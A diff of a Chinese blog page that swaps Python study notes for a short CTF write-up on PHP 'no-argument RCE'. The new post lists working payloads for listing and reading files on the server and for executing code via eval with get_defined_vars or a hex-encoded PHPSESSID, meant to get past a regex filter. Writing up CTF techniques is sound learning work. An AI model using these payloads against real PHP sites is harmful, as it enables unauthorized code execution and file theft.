@@ -6,19 +6,19 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>python学习中部分易忘知识点 | Gm_blog</title>
+  <title>ctfweb-无参RCE | Gm_blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="本文是我在py学习中总结梳理了一些常用的易忘的知识点，为方便回顾和复习，遂加以记录。 本文我会不断的学习并总结。">
+  <meta name="description" content="最近做题遇到了几道无参数RCE的题，基本上还是不会，在此总结一下payload">
 <meta property="og:type" content="article">
-<meta property="og:title" content="python学习中部分易忘知识点">
-<meta property="og:url" content="http://example.com/2021/06/29/python%E4%B8%AD%E9%83%A8%E5%88%86%E7%9F%A5%E8%AF%86%E7%82%B9/index.html">
+<meta property="og:title" content="ctfweb-无参RCE">
+<meta property="og:url" content="http://example.com/2021/08/13/ctfweb-%E6%97%A0%E5%8F%82RCE/index.html">
 <meta property="og:site_name" content="Gm_blog">
-<meta property="og:description" content="本文是我在py学习中总结梳理了一些常用的易忘的知识点，为方便回顾和复习，遂加以记录。 本文我会不断的学习并总结。">
+<meta property="og:description" content="最近做题遇到了几道无参数RCE的题，基本上还是不会，在此总结一下payload">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2021-06-29T10:41:39.545Z">
-<meta property="article:modified_time" content="2021-08-03T10:21:20.874Z">
+<meta property="article:published_time" content="2021-08-13T10:49:41.433Z">
+<meta property="article:modified_time" content="2021-08-13T10:50:15.799Z">
 <meta property="article:author" content="gaomeng">
-<meta property="article:tag" content="python">
+<meta property="article:tag" content="RCE">
 <meta name="twitter:card" content="summary">
   
     <link rel="alternative" href="/atom.xml" title="Gm_blog" type="application/atom+xml">
@@ -171,96 +171,64 @@
           </div>
           <div id="js-content" class="content-ll">
             
-<article id="post-python中部分知识点" class="article article-type-post " itemscope itemprop="blogPost">
+<article id="post-ctfweb-无参RCE" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      python学习中部分易忘知识点
+      ctfweb-无参RCE
     </h1>
   
 
         
-        <a href="/2021/06/29/python%E4%B8%AD%E9%83%A8%E5%88%86%E7%9F%A5%E8%AF%86%E7%82%B9/" class="archive-article-date">
-  	<time datetime="2021-06-29T10:41:39.545Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-06-29</time>
+        <a href="/2021/08/13/ctfweb-%E6%97%A0%E5%8F%82RCE/" class="archive-article-date">
+  	<time datetime="2021-08-13T10:49:41.433Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-13</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>本文是我在py学习中总结梳理了一些常用的易忘的知识点，为方便回顾和复习，遂加以记录。</p>
-<p>本文我会不断的学习并总结。</p>
+        <p>最近做题遇到了几道无参数RCE的题，基本上还是不会，在此总结一下payload</p>
 <span id="more"></span>
 
 <hr>
-<h2 id="1-不希望出现转义字符起作用，在printf-中加r-R"><a href="#1-不希望出现转义字符起作用，在printf-中加r-R" class="headerlink" title="1.不希望出现转义字符起作用，在printf()中加r/R"></a>1.不希望出现转义字符起作用，在printf()中加r/R</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">printf (r <span class="string">&#x27;hello\n world&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#但要注意，最后一个字符不能是\</span></span><br><span class="line"></span><br><span class="line">printf (r <span class="string">&#x27;hello\n world\&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#上面的写法是错的</span></span><br></pre></td></tr></table></figure>
+<p><strong>常见提示：</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $_GET[<span class="string">&#x27;xxx&#x27;</span>])</span><br></pre></td></tr></table></figure>
 
+<p>有这种屏蔽的，一般都是无参数rce：</p>
+<ul>
+<li>(?R)引用当前表达式，后面加了?递归调用。允许执行类似<code>a(b(c()))</code>格式的无参数函数；</li>
+</ul>
 <hr>
-<h2 id="2-将数据输出到文件中去"><a href="#2-将数据输出到文件中去" class="headerlink" title="2.将数据输出到文件中去"></a>2.将数据输出到文件中去</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fp = <span class="built_in">open</span> ( <span class="string">&#x27;D:/text.txt&#x27;</span> , <span class="string">&#x27;a+&#x27;</span>)</span><br><span class="line"></span><br><span class="line">printf (<span class="string">&#x27;hello world&#x27;</span> , file = fp)</span><br><span class="line"></span><br><span class="line">fp.close()</span><br></pre></td></tr></table></figure>
+<p><strong>常见方法：</strong></p>
+<p>1.<em>查看当前目录下的文件</em></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(pos(localeconv())));  <span class="comment">#pos()函数可以替换为current()函数，一个意思</span></span><br></pre></td></tr></table></figure>
 
+<p>2.<em>暴露出数组中文件的名字，方便用函数读取</em></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(array_rand(array_flip(scandir(pos(localeconv()))))); <span class="comment">#原理就是随机生成键并反转，让名字暴露出来</span></span><br></pre></td></tr></table></figure>
+
+<p>3.<em>读取文件</em></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents();file();readfile();highlight_file();show_source(); <span class="comment">#都可以试试</span></span><br></pre></td></tr></table></figure>
+
+<p>4.<em>进行命令执行输入</em></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(end(current(get_defined_vars())));&amp;b=phpinfo();</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>get_defined_vars ( void ) ，此函数返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量等</li>
+<li>curren() ，用于初始指向插入到数组中的第一个单元。</li>
+<li>end()，作用是将 array 的内部指针移动到最后一个单元并返回其值。</li>
+<li>然后 eval() 执行命令即可。</li>
+</ul>
+<p>5.<em>用 http headers头部的 session的函数获取 flag</em></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(hex2bin(session_id(session_start())))</span><br></pre></td></tr></table></figure>
+
+<p>配合burp即可，把要执行的代码16进制后输入 phpsessid</p>
 <hr>
-<h2 id="3-相比于c语言，多的常用数据类型"><a href="#3-相比于c语言，多的常用数据类型" class="headerlink" title="3.相比于c语言，多的常用数据类型"></a>3.相比于c语言，多的常用数据类型</h2><p>布尔类型——bool ( Ture , False )</p>
-<p>字符串类型——str ( 与c字符串类似 )</p>
-<p>整数类型中：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">printf(<span class="string">&#x27;十进制&#x27;</span> , )  <span class="comment">#不用加开头</span></span><br><span class="line"></span><br><span class="line">printf (<span class="string">&#x27;二进制&#x27;</span> , 0b )  <span class="comment"># 要加开头</span></span><br><span class="line"></span><br><span class="line">printf (<span class="string">&#x27;八进制&#x27;</span> , 0o )</span><br><span class="line"></span><br><span class="line">printf (<span class="string">&#x27;十六进制&#x27;</span> , 0x )</span><br></pre></td></tr></table></figure>
-
-<p>浮点数计算中可能出现不精确的情况，另行解决。</p>
-<p>字符串在多换行显示用 ‘’‘xxx’‘’   or   “”“xxx”“”</p>
-<hr>
-<h2 id="4-print注意"><a href="#4-print注意" class="headerlink" title="4.print注意"></a>4.print注意</h2><p>在一句printf()里,不能同时出现多种数据类型，但可以用str() / int() /  float()</p>
-<hr>
-<h2 id="5-计算和定义注意"><a href="#5-计算和定义注意" class="headerlink" title="5.计算和定义注意"></a>5.计算和定义注意</h2><p>在py3里   </p>
-<p> **表示乘方   </p>
-<p> //表示整除</p>
-<p>数字很大时，可以用下划线来分隔，更清晰易读，py不会打印下划线</p>
-<p>相比于c语言，py可以这样赋值： x, y, z = 0, 0, 0</p>
-<p>常量一般用全大写表示</p>
-<hr>
-<h2 id="6-总结一些常用的方法（后面遇到的也写到这里了）"><a href="#6-总结一些常用的方法（后面遇到的也写到这里了）" class="headerlink" title="6.总结一些常用的方法（后面遇到的也写到这里了）"></a>6.总结一些常用的方法（后面遇到的也写到这里了）</h2><p><strong>title()</strong>    以首字母大写的方式显示每个单词</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">name = <span class="string">&quot;ada lovelace&quot;</span></span><br><span class="line"><span class="built_in">print</span>(name.title())</span><br><span class="line">-----</span><br><span class="line">Ada Lovelace</span><br></pre></td></tr></table></figure>
-
-<p><strong>upper()</strong>    全大写字母显示单词</p>
-<p><strong>lower()</strong>    全小写字母显示单词</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">name = <span class="string">&quot;ada lovelace&quot;</span></span><br><span class="line"><span class="built_in">print</span>(name.upper())</span><br><span class="line"><span class="built_in">print</span>(name.lower())</span><br><span class="line">-----</span><br><span class="line">ADA LOVELACE</span><br><span class="line">ada lovelace</span><br></pre></td></tr></table></figure>
-
-<p><strong>format()</strong>    这个方法在3.6以后的版本已经换为用  f字符  连接字符串了（所以只写了f字符的用法）</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">first_name = <span class="string">&quot;ada&quot;</span></span><br><span class="line">last_name = <span class="string">&quot;lovelace&quot;</span></span><br><span class="line">full_name = <span class="string">f&quot;<span class="subst">&#123;first_name&#125;</span> <span class="subst">&#123;last_name&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Hello, <span class="subst">&#123;full_name.title()&#125;</span>!&quot;</span>)</span><br><span class="line">-----</span><br><span class="line">Hello, Ada Lovelace</span><br></pre></td></tr></table></figure>
-
-<p><strong>rstrip()</strong>    删除末尾空白</p>
-<p><strong>lstrip()</strong>    删除开头空白</p>
-<p><strong>strip()</strong>     删除字符串两边的空白</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">language_1 = <span class="string">&quot;python &quot;</span></span><br><span class="line">language_2 = <span class="string">&quot; python&quot;</span></span><br><span class="line">language_1 = language_1.rstrip()</span><br><span class="line">language_2 = language_2.lstrip()</span><br><span class="line"><span class="built_in">print</span>(language_1)</span><br><span class="line"><span class="built_in">print</span>(language_2)</span><br><span class="line">-----</span><br><span class="line">python</span><br><span class="line">python</span><br></pre></td></tr></table></figure>
-
-<p><strong>append()</strong>    在列表末尾添加元素</p>
-<p><strong>insert()</strong>        在列表的任何位置添加元素</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">phones = [<span class="string">&#x27;apple&#x27;</span>, <span class="string">&#x27;huawei&#x27;</span>, <span class="string">&#x27;oppo&#x27;</span>, <span class="string">&#x27;vivo&#x27;</span>]</span><br><span class="line">phones.append(<span class="string">&#x27;honor&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(phones)</span><br><span class="line"><span class="built_in">print</span>()	<span class="comment">#换行</span></span><br><span class="line"></span><br><span class="line">phones = [<span class="string">&#x27;apple&#x27;</span>, <span class="string">&#x27;huawei&#x27;</span>, <span class="string">&#x27;oppo&#x27;</span>, <span class="string">&#x27;vivo&#x27;</span>]</span><br><span class="line">phones.insert(<span class="number">0</span>,<span class="string">&#x27;honor&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(phones)</span><br><span class="line">-----</span><br><span class="line">[<span class="string">&#x27;apple&#x27;</span>, <span class="string">&#x27;huawei&#x27;</span>, <span class="string">&#x27;oppo&#x27;</span>, <span class="string">&#x27;vivo&#x27;</span>, <span class="string">&#x27;honor&#x27;</span>]</span><br><span class="line"></span><br><span class="line">[<span class="string">&#x27;honor&#x27;</span>, <span class="string">&#x27;apple&#x27;</span>, <span class="string">&#x27;huawei&#x27;</span>, <span class="string">&#x27;oppo&#x27;</span>, <span class="string">&#x27;vivo&#x27;</span>]</span><br></pre></td></tr></table></figure>
-
-<p><strong>del语句</strong>    删除元素，需要知道元素的位置</p>
-<p><strong>pop()</strong>        当需要删除值并接着使用时，用pop，否则可以用del语句删除</p>
-<p><strong>remove()</strong>        根据值删除元素</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">phones = [<span class="string">&#x27;apple&#x27;</span>, <span class="string">&#x27;huawei&#x27;</span>, <span class="string">&#x27;oppo&#x27;</span>, <span class="string">&#x27;vivo&#x27;</span>]</span><br><span class="line"><span class="keyword">del</span> phones[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(phones)</span><br><span class="line"><span class="built_in">print</span>()	<span class="comment">#换行</span></span><br><span class="line"></span><br><span class="line">phones = [<span class="string">&#x27;apple&#x27;</span>, <span class="string">&#x27;huawei&#x27;</span>, <span class="string">&#x27;oppo&#x27;</span>, <span class="string">&#x27;vivo&#x27;</span>]</span><br><span class="line">buy = phones.pop(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(phones)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;I will buy <span class="subst">&#123;buy&#125;</span> phone.&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">phones = [<span class="string">&#x27;apple&#x27;</span>, <span class="string">&#x27;huawei&#x27;</span>, <span class="string">&#x27;oppo&#x27;</span>, <span class="string">&#x27;vivo&#x27;</span>]</span><br><span class="line">phones.remove(<span class="string">&#x27;apple&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(phones)</span><br><span class="line"><span class="comment">#remove 有pop一样的用法，可以在删除时调用。</span></span><br><span class="line"><span class="comment">#remove只删除第一次出现的值，如果有多个一样的都需要删除，需要用while循环。</span></span><br><span class="line">-----</span><br><span class="line">[<span class="string">&#x27;huawei&#x27;</span>, <span class="string">&#x27;oppo&#x27;</span>, <span class="string">&#x27;vivo&#x27;</span>]</span><br><span class="line"></span><br><span class="line">[<span class="string">&#x27;apple&#x27;</span>, <span class="string">&#x27;oppo&#x27;</span>, <span class="string">&#x27;vivo&#x27;</span>]</span><br><span class="line">I will buy huawei phone.</span><br><span class="line"></span><br><span class="line">[<span class="string">&#x27;huawei&#x27;</span>, <span class="string">&#x27;oppo&#x27;</span>, <span class="string">&#x27;vivo&#x27;</span>]`</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h2 id="7-列表（相关方法在6）"><a href="#7-列表（相关方法在6）" class="headerlink" title="7.列表（相关方法在6）"></a>7.列表（相关方法在6）</h2><p>普通列表及访问</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">phones = [<span class="string">&#x27;apple&#x27;</span>, <span class="string">&#x27;huawei&#x27;</span>, <span class="string">&#x27;oppo&#x27;</span>, <span class="string">&#x27;vivo&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(phones)		<span class="comment">#全部打印</span></span><br><span class="line"><span class="built_in">print</span>(phones[<span class="number">2</span>])		<span class="comment">#单个打印</span></span><br><span class="line"><span class="built_in">print</span>(phones[-<span class="number">1</span>])	<span class="comment">#索引-1可以访问最后一个</span></span><br><span class="line"></span><br><span class="line">-----</span><br><span class="line">[<span class="string">&#x27;apple&#x27;</span>, <span class="string">&#x27;huawei&#x27;</span>, <span class="string">&#x27;oppo&#x27;</span>, <span class="string">&#x27;vivo&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;oppo&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;vivo&#x27;</span>]</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+<p>后续遇到新的再补充</p>
+<p>END</p>
 
       
 
@@ -305,7 +273,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">python</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">RCE</a>
         		</li>
       		
 		</ul>
@@ -361,7 +329,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://2740908911.github.io/021/06/29/python%E4%B8%AD%E9%83%A8%E5%88%86%E7%9F%A5%E8%AF%86%E7%82%B9/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://2740908911.github.io/021/08/13/ctfweb-%E6%97%A0%E5%8F%82RCE/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -375,18 +343,9 @@
   
 <nav id="article-nav">
   
-    <a href="/2021/07/01/php%E5%AD%A6%E4%B9%A0%E4%B8%AD%E4%B8%80%E4%BA%9B%E6%98%93%E5%BF%98%E7%9A%84%E7%9F%A5%E8%AF%86%E7%82%B9/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          php的浅显学习中一些知识点
-        
-      </div>
-    </a>
   
-  
-    <a href="/2021/06/28/(wp)ctfweb-buu%E4%B8%ADssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">（wp）ctfweb-buu中ssti模板注入</div>
+    <a href="/2021/08/10/%EF%BC%88wp%EF%BC%89ctfweb-%E5%87%A0%E9%81%93%E5%BA%8F%E5%88%97%E5%8C%96%E7%9B%B8%E5%85%B3%E7%9A%84%E9%A2%98(POP%E9%93%BE%E3%80%81%E9%80%83%E9%80%B8)/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">（wp）ctfweb-几道序列化相关的题(POP链、逃逸)</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -413,7 +372,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E4%B8%8D%E5%B8%8C%E6%9C%9B%E5%87%BA%E7%8E%B0%E8%BD%AC%E4%B9%89%E5%AD%97%E7%AC%A6%E8%B5%B7%E4%BD%9C%E7%94%A8%EF%BC%8C%E5%9C%A8printf-%E4%B8%AD%E5%8A%A0r-R"><span class="toc-number">1.</span> <span class="toc-text">1.不希望出现转义字符起作用，在printf()中加r&#x2F;R</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E5%B0%86%E6%95%B0%E6%8D%AE%E8%BE%93%E5%87%BA%E5%88%B0%E6%96%87%E4%BB%B6%E4%B8%AD%E5%8E%BB"><span class="toc-number">2.</span> <span class="toc-text">2.将数据输出到文件中去</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E7%9B%B8%E6%AF%94%E4%BA%8Ec%E8%AF%AD%E8%A8%80%EF%BC%8C%E5%A4%9A%E7%9A%84%E5%B8%B8%E7%94%A8%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B"><span class="toc-number">3.</span> <span class="toc-text">3.相比于c语言，多的常用数据类型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-print%E6%B3%A8%E6%84%8F"><span class="toc-number">4.</span> <span class="toc-text">4.print注意</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-%E8%AE%A1%E7%AE%97%E5%92%8C%E5%AE%9A%E4%B9%89%E6%B3%A8%E6%84%8F"><span class="toc-number">5.</span> <span class="toc-text">5.计算和定义注意</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-%E6%80%BB%E7%BB%93%E4%B8%80%E4%BA%9B%E5%B8%B8%E7%94%A8%E7%9A%84%E6%96%B9%E6%B3%95%EF%BC%88%E5%90%8E%E9%9D%A2%E9%81%87%E5%88%B0%E7%9A%84%E4%B9%9F%E5%86%99%E5%88%B0%E8%BF%99%E9%87%8C%E4%BA%86%EF%BC%89"><span class="toc-number">6.</span> <span class="toc-text">6.总结一些常用的方法（后面遇到的也写到这里了）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-%E5%88%97%E8%A1%A8%EF%BC%88%E7%9B%B8%E5%85%B3%E6%96%B9%E6%B3%95%E5%9C%A86%EF%BC%89"><span class="toc-number">7.</span> <span class="toc-text">7.列表（相关方法在6）</span></a></li></ol>
+                    目录，不存在的…
                     </div>
                 </span>
             </div>
@@ -429,7 +388,7 @@
   
 
   
-  <div id="SOHUCS" sid="python中部分知识点" ></div> 
+  <div id="SOHUCS" sid="ctfweb-无参RCE" ></div> 
 <script charset="utf-8" type="text/javascript" src="//changyan.sohu.com/upload/changyan.js" ></script>
 <script type="text/javascript">
     window.changyan.api.config({
